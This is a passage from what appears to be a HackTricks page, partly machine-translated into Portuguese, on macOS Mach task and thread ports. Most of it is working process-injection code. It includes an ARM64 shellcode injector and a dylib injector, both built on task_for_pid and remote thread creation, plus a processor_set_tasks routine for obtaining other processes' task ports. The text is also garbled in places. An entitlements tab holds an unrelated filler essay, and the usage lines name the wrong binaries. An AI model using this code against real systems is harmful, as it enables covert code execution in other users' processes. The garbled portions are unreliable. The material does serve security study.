Além disso, a porta da tarefa é também a **porta `vm_map`** que permite **ler e manipular memória** dentro de uma tarefa com funções como `vm_read()` e `vm_write()`. Isso basicamente significa que uma tarefa com direitos de envio sobre a porta da tarefa de uma tarefa diferente será capaz de **injetar código nessa tarefa**.

Lembre-se de que porque o **kernel também é uma tarefa**, se alguém conseguir obter permissões de **envio** sobre o **`kernel_task`**, será capaz de fazer o kernel executar qualquer coisa (jailbreaks).

* Chame `mach_task_self()` para **obter o nome** desta porta para a tarefa chamadora. Esta porta é **herdada** apenas através de **`exec()`**; uma nova tarefa criada com `fork()` obtém uma nova porta de tarefa (como caso especial, uma tarefa também obtém uma nova porta de tarefa após `exec()` em um binário suid). A única maneira de gerar uma tarefa e obter sua porta é realizar a ["dança de troca de portas"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) enquanto faz um `fork()`.
* Estas são as restrições para acessar a porta (de `macos_task_policy` do binário `AppleMobileFileIntegrity`):
* Se o aplicativo tiver a **permissão `com.apple.security.get-task-allow`**, processos do **mesmo usuário podem acessar a porta da tarefa** (comumente adicionado pelo Xcode para depuração). O processo de **notarização** não permitirá isso em lançamentos de produção.
* Aplicativos com a permissão **`com.apple.system-task-ports`** podem obter a **porta da tarefa para qualquer** processo, exceto o kernel. Em versões mais antigas, era chamado de **`task_for_pid-allow`**. Isso é concedido apenas a aplicativos da Apple.
* **Root pode acessar portas de tarefas** de aplicativos **não** compilados com um tempo de execução **fortificado** (e não da Apple).

**A porta do nome da tarefa:** Uma versão não privilegiada da _porta da tarefa_. Ela faz referência à tarefa, mas não permite controlá-la. A única coisa que parece estar disponível por meio dela é `task_info()`.

### Portas de Thread

As threads também têm portas associadas, que são visíveis da tarefa chamando **`task_threads`** e do processador com `processor_set_threads`. Um direito de envio para a porta da thread permite usar a função do subsistema `thread_act`, como:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

Qualquer thread pode obter esta porta chamando **`mach_thread_sef`**.

### Injeção de Shellcode na thread via Porta de Tarefa

Você pode obter um shellcode de:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

## macOS IPC (Comunicação entre Processos)

### Introdução

A Comunicação entre Processos (IPC) é um mecanismo essencial para que os processos em um sistema operacional possam trocar informações e coordenar suas atividades. No macOS, existem várias formas de IPC, como notificações distribuídas, Apple Events, XPC e IPC baseado em porta.

### Abuso de Processos

Os processos no macOS podem abusar dos mecanismos de IPC para obter privilégios elevados ou realizar ações maliciosas. É importante entender como os processos legítimos usam a IPC e monitorar atividades suspeitas para identificar possíveis abusos.

### Protegendo contra Abusos

Para proteger um sistema macOS contra abusos de IPC, é fundamental implementar práticas de segurança, como restringir as permissões de IPC por meio de arquivos de entitlements e monitorar o uso de IPC por processos suspeitos.

### Conclusão

Ao compreender os mecanismos de IPC no macOS e adotar medidas proativas para proteger contra abusos, é possível fortalecer a segurança do sistema e reduzir o risco de escalonamento de privilégios e atividades maliciosas. 

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compile** o programa anterior e adicione os **privilégios** para poder injetar código com o mesmo usuário (caso contrário, será necessário usar **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Para que isso funcione no iOS, você precisa da permissão `dynamic-codesigning` para poder tornar uma memória gravável executável.
{% endhint %}

### Injeção de Dylib em thread via porta de Tarefa

No macOS, **threads** podem ser manipulados via **Mach** ou usando a **api posix `pthread`**. A thread que geramos na injeção anterior foi gerada usando a api Mach, então **não é compatível com posix**.

Foi possível **injetar um shellcode simples** para executar um comando porque **não precisava trabalhar com apis compatíveis com posix**, apenas com Mach. **Injeções mais complexas** precisariam que a **thread** também fosse **compatível com posix**.

Portanto, para **melhorar a thread**, ela deve chamar **`pthread_create_from_mach_thread`** que irá **criar um pthread válido**. Em seguida, este novo pthread poderia **chamar dlopen** para **carregar uma dylib** do sistema, então em vez de escrever um novo shellcode para realizar ações diferentes, é possível carregar bibliotecas personalizadas.

Você pode encontrar **dylibs de exemplo** em (por exemplo, aquela que gera um log e então você pode ouvi-lo):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Não foi possível definir as permissões de memória para o código da thread remota: Erro %s\n", mach_error_string(kr));
return (-4);
}

// Definir as permissões na memória alocada para a pilha
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Não foi possível definir as permissões de memória para a pilha da thread remota: Erro %s\n", mach_error_string(kr));
return (-4);
}


// Criar thread para executar o shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // esta é a pilha real
//remoteStack64 -= 8;  // necessita alinhamento de 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Pilha Remota 64  0x%llx, Código Remoto é %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Não foi possível criar a thread remota: erro %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Uso: %s _pid_ _ação_\n", argv[0]);
fprintf (stderr, "   _ação_: caminho para um dylib no disco\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *ação = argv[2];
struct stat buf;

int rc = stat (ação, &buf);
if (rc == 0) inject(pid,ação);
else
{
fprintf(stderr,"Dylib não encontrado\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Sequestro de Thread via porta de tarefa <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Nesta técnica, uma thread do processo é sequestrada:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Detecção de Injeção de Porta de Tarefa

Ao chamar `task_for_pid` ou `thread_create_*`, um contador na estrutura de tarefa do kernel é incrementado, o qual pode ser acessado a partir do modo de usuário chamando task\_info(task, TASK\_EXTMOD\_INFO, ...)

## Portas de Exceção

Quando uma exceção ocorre em uma thread, esta exceção é enviada para a porta de exceção designada da thread. Se a thread não a manipular, então é enviada para as portas de exceção da tarefa. Se a tarefa não a manipular, então é enviada para a porta do host que é gerenciada pelo launchd (onde será reconhecida). Isso é chamado de triagem de exceção.

Observe que no final, geralmente, se não for manipulada corretamente, o relatório acabará sendo manipulado pelo daemon ReportCrash. No entanto, é possível para outra thread na mesma tarefa gerenciar a exceção, isso é o que ferramentas de relatório de falhas como `PLCrashReporter` fazem.

## Outros Objetos

### Relógio

Qualquer usuário pode acessar informações sobre o relógio, no entanto, para definir a hora ou modificar outras configurações, é necessário ser root.

Para obter informações, é possível chamar funções do subsistema `clock` como: `clock_get_time`, `clock_get_attributtes` ou `clock_alarm`\
Para modificar valores, o subsistema `clock_priv` pode ser usado com funções como `clock_set_time` e `clock_set_attributes`

### Processadores e Conjunto de Processadores

As APIs de processador permitem controlar um único processador lógico chamando funções como `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Além disso, as APIs do **conjunto de processadores** fornecem uma maneira de agrupar vários processadores em um grupo. É possível recuperar o conjunto de processadores padrão chamando **`processor_set_default`**.\
Aqui estão algumas APIs interessantes para interagir com o conjunto de processadores:

* `processor_set_statistics`
* `processor_set_tasks`: Retorna uma matriz de direitos de envio para todas as tarefas dentro do conjunto de processadores
* `processor_set_threads`: Retorna uma matriz de direitos de envio para todas as threads dentro do conjunto de processadores
* `processor_set_stack_usage`
* `processor_set_info`

Conforme mencionado neste [**post**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), no passado, isso permitia contornar a proteção mencionada anteriormente para obter portas de tarefa em outros processos para controlá-los chamando **`processor_set_tasks`** e obtendo uma porta de host em cada processo.\
Atualmente, é necessário ter privilégios de root para usar essa função e ela é protegida, então você só poderá obter essas portas em processos não protegidos.

Você pode tentar com:

<details>

<summary><strong>código de processor_set_tasks</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
